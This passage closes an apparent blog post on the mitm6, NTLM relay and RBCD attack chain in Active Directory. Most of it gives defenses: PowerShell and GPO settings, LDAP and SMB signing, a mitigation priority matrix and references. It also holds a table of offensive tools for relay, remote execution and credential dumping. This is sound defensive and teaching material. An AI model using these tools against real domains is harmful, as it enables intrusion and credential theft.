    Set-NetIPInterface -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv6 -RouterDiscovery Disabled -Dhcp Disabled
}
```

Verify the settings:

```powershell
PS C:\Tools> Get-NetIPInterface -AddressFamily IPv6 | Select-Object InterfaceAlias, Dhcp, RouterDiscovery

InterfaceAlias         Dhcp     RouterDiscovery
--------------         ----     ---------------
Ethernet               Disabled Disabled
Loopback Pseudo-Int... Disabled Disabled
```

#### 3. Deploy Legitimate DHCPv6 with DHCPv6 Guard

If your organization actually uses IPv6, deploy a legitimate DHCPv6 server and enable **DHCPv6 Guard** on managed switches. This feature (available on Cisco, Juniper, and other enterprise switches) blocks unauthorized DHCPv6 responses.

```
! Cisco IOS example
ipv6 dhcp guard policy DHCP_GUARD
  device-role server
  trusted-port
interface GigabitEthernet0/1
  ipv6 dhcp guard attach-policy DHCP_GUARD
```

### Active Directory Level Defenses

#### 1. Set MachineAccountQuota to 0

This prevents any non-admin user from creating machine accounts, blocking the automatic machine account creation in the RBCD attack:

```powershell
PS C:\Tools> Set-ADDomain -Identity inlanefreight.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

Verify:

```powershell
PS C:\Tools> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

ms-DS-MachineAccountQuota : 0
```

> Setting MAQ to 0 may impact automated domain join processes. Ensure you have a delegated process for IT staff to join machines to the domain (e.g., pre-staging accounts or delegating join permissions to specific OUs).
{: .prompt-warning }

#### 2. Enforce LDAP Signing and Channel Binding

**LDAP Signing** prevents NTLM relay to LDAP by requiring message integrity:

GPO Path: `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options`

- **Domain controller: LDAP server signing requirements** → Set to `Require signing`
- **Network security: LDAP client signing requirements** → Set to `Require signing`

**LDAP Channel Binding** prevents relay to LDAPS:

Registry key on Domain Controllers:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
LdapEnforceChannelBinding = 2 (Always)
```

> **Test thoroughly before enforcing.** LDAP signing and channel binding can break legacy applications, LDAP-based monitoring tools, and older print/scan devices that use simple LDAP binds. Audit first with event logging before enforcing.
{: .prompt-danger }

#### 3. Disable WPAD via GPO

GPO Path: `User Configuration → Preferences → Windows Settings → Registry`

Create a registry entry:
- **Hive:** HKEY_CURRENT_USER
- **Key:** Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad
- **Value name:** WpadOverride
- **Value type:** REG_DWORD
- **Value data:** 1

Alternatively, disable "Automatically detect settings" in Internet Options via GPO:

GPO Path: `User Configuration → Policies → Windows Settings → Internet Explorer Maintenance → Connection → Automatic Browser Configuration`

- Uncheck "Automatically detect configuration settings"

#### 4. Protect Privileged Accounts from Delegation

For all Domain Admins and other high-privilege accounts:

- Enable **"Account is sensitive and cannot be delegated"** flag:

```powershell
PS C:\Tools> Get-ADUser -Identity dadmin | Set-ADAccountControl -AccountNotDelegated $true
```

- Add to the **Protected Users** security group:

```powershell
PS C:\Tools> Add-ADGroupMember -Identity "Protected Users" -Members dadmin
```

> Protected Users group members cannot use NTLM authentication, cannot be delegated, and have additional Kerberos restrictions. This effectively prevents their accounts from being impersonated via S4U2Proxy.
{: .prompt-tip }

#### 5. Monitor Sensitive Attribute Changes

Set up auditing for changes to:

- `msDS-AllowedToActOnBehalfOfOtherIdentity` — RBCD configuration
- `msDS-KeyCredentialLink` — Shadow Credentials
- `msDS-AllowedToDelegateTo` — Constrained Delegation

Enable Directory Service Changes auditing:

GPO Path: `Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → DS Access`

- **Audit Directory Service Changes** → Success, Failure

### Authentication Level Defenses

#### 1. Disable NTLM Where Possible

GPO Path: `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options`

- **Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers** → Deny all
- **Network security: Restrict NTLM: Incoming NTLM traffic** → Deny all domain accounts

> Start with **audit mode** before denying NTLM traffic. Use Event IDs 8001-8004 in `Applications and Services Logs → Microsoft → Windows → NTLM` to identify applications still using NTLM.
{: .prompt-tip }

#### 2. Enable Extended Protection for Authentication (EPA)

EPA adds channel binding tokens to authentication requests, making relay attacks significantly harder. Enable for:

- IIS servers
- AD FS
- Exchange (OWA, EWS)
- Any web application accepting NTLM

#### 3. Enforce SMB Signing Domain-Wide

GPO Path: `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options`

- **Microsoft network server: Digitally sign communications (always)** → Enabled
- **Microsoft network client: Digitally sign communications (always)** → Enabled

This prevents SMB-based NTLM relay (e.g., when combined with CVE-2019-1040's `--remove-mic`).

### Mitigation Priority Matrix

| Mitigation | Effort | Impact | Priority |
|---|---|---|---|
| Block DHCPv6 via Firewall GPO | Low | **Kills mitm6 entirely** | 🔴 Critical |
| Set MAQ to 0 | Low | Blocks auto machine account creation | 🔴 Critical |
| Enforce LDAP signing | Medium | Blocks NTLM relay to LDAP | 🔴 Critical |
| Enforce LDAP channel binding | Medium | Blocks NTLM relay to LDAPS | 🟡 High |
| Disable WPAD via GPO | Low | Blocks WPAD-based auth trigger | 🟡 High |
| Protect privileged accounts | Low | Prevents DA impersonation | 🟡 High |
| Enable SMB signing | Medium | Blocks SMB relay | 🟡 High |
| Disable NTLM | High | Eliminates NTLM relay entirely | 🟢 Long-term |
| Deploy DHCPv6 Guard on switches | Medium | Network-level prevention | 🟢 Long-term |

---

## Tool Reference Table

| Tool | Purpose | Platform | Link |
|---|---|---|---|
| **mitm6** | DHCPv6 spoofing + DNS poisoning | Linux (Python) | [GitHub](https://github.com/dirkjanm/mitm6) |
| **ntlmrelayx.py** | NTLM relay server (LDAP/SMB/HTTP/ADCS) | Linux (Python/Impacket) | [GitHub](https://github.com/fortra/impacket) |
| **getST.py** | S4U2Self + S4U2Proxy ticket requests | Linux (Python/Impacket) | [GitHub](https://github.com/fortra/impacket) |
| **psexec.py** | Remote code execution via SMB service | Linux (Python/Impacket) | [GitHub](https://github.com/fortra/impacket) |
| **smbexec.py** | Remote code execution via SMB | Linux (Python/Impacket) | [GitHub](https://github.com/fortra/impacket) |
| **wmiexec.py** | Remote execution via WMI | Linux (Python/Impacket) | [GitHub](https://github.com/fortra/impacket) |
| **secretsdump.py** | Credential dumping (SAM/NTDS/LSA) | Linux (Python/Impacket) | [GitHub](https://github.com/fortra/impacket) |
| **smbclient.py** | SMB file access | Linux (Python/Impacket) | [GitHub](https://github.com/fortra/impacket) |
| **gettgtpkinit.py** | PKINIT TGT request (Shadow Credentials) | Linux (Python/PKINITtools) | [GitHub](https://github.com/dirkjanm/PKINITtools) |
| **getnthash.py** | Extract NT hash from Kerberos PAC | Linux (Python/PKINITtools) | [GitHub](https://github.com/dirkjanm/PKINITtools) |
| **certipy** | AD CS enumeration and exploitation | Linux (Python) | [GitHub](https://github.com/ly4k/Certipy) |
| **Inveigh** | DHCPv6/WPAD/NTLM capture and relay | Windows (PowerShell/C#) | [GitHub](https://github.com/Kevin-Robertson/Inveigh) |
| **Rubeus** | Kerberos ticket manipulation | Windows (C#) | [GitHub](https://github.com/GhostPack/Rubeus) |
| **KrbRelayUp** | Local RBCD privilege escalation | Windows (C#) | [GitHub](https://github.com/Dec0ne/KrbRelayUp) |
| **DavRelayUp** | Local RBCD via WebDAV relay | Windows (C#) | [GitHub](https://github.com/Dec0ne/DavRelayUp) |
| **Responder** | LLMNR/NBNS/mDNS poisoning + auth capture | Linux (Python) | [GitHub](https://github.com/lgandx/Responder) |
| **NetExec (nxc)** | Network protocol execution and enumeration | Linux (Python) | [GitHub](https://github.com/Pennyw0rth/NetExec) |

---

## References

1. **Dirk-jan Mollema** — [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) — Original blog post describing the mitm6 + RBCD attack chain
2. **mitm6 tool** — [https://github.com/dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)
3. **Elad Shamir** — [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) — Foundational RBCD research
4. **Impacket** — [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
5. **PKINITtools** — [https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
6. **KrbRelayUp** — [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
7. **DavRelayUp** — [https://github.com/Dec0ne/DavRelayUp](https://github.com/Dec0ne/DavRelayUp)
8. **Inveigh** — [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
9. **Resecurity** — [MITM6 + NTLM Relay: How IPv6 Auto-Configuration Leads to Full Domain Compromise](https://www.resecurity.com/blog/article/mitm6-ntlm-relay-how-ipv6-auto-configuration-leads-to-full-domain-compromise)
10. **GuidePoint Security** — [Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques](https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/)
11. **The Hacker Recipes** — [DHCPv6 Spoofing](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/dhcpv6-spoofing)
12. **Microsoft** — [msDS-AllowedToActOnBehalfOfOtherIdentity](https://docs.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
13. **Ebrahem Hegazy** — @Hack 2021 Briefings: "Local Domain Admin Impersonation"
14. **ired.team** — [Resource-Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
15. **Evolve Security** — [Tools of the Trade: IPv6 DNS Takeover with mitm6](https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-ipv6-dns-takeover-with-mitm6)
16. **Dirk-jan Mollema** — [Exploiting CVE-2019-1040 — Combining relay vulnerabilities for RCE and Domain Admin](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
17. **Dirk-jan Mollema** — [NTLM relaying to AD CS — On certificates, printers and a little hippo](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
18. **Dirk-jan Mollema** — [Relaying Kerberos over DNS using krbrelayx and mitm6](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
19. **The Hacker Recipes** — [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
20. **SpecterOps** — [ESC8 — NTLM Relay to AD CS HTTP Endpoints](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc8-ntlm-relay-to-ad-cs-http-endpoints)
